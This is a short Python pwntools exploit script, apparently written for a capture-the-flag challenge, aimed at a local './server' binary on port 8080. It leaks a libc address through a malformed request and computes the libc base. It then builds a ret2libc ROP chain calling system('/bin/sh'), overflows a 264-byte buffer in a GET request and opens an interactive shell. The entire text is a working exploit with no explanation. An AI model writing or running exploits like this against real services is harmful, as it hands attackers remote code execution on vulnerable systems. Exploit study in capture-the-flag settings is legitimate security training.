from pwn import *

context.binary = elf = ELF("./server")
libc = ELF("./libc.so.6")
process = remote("127.0.0.1", 8080)

# Leak libc
process.send(b"BOCCHI /\n")
process.recvuntil(b"\r\n\r\n")
leak = u64(process.recv(8)) # on récupere les 8 premier octet
libc.address = leak - libc.symbols["_IO_2_1_stdout_"]

# ROP
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret     = rop.find_gadget(["ret"])[0]
system  = libc.symbols["system"]
binsh   = next(libc.search(b"/bin/sh\x00"))

payload  = p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

payload = b"A"*264 + payload

process.send(b"GET " + payload + b" \n")

process.interactive()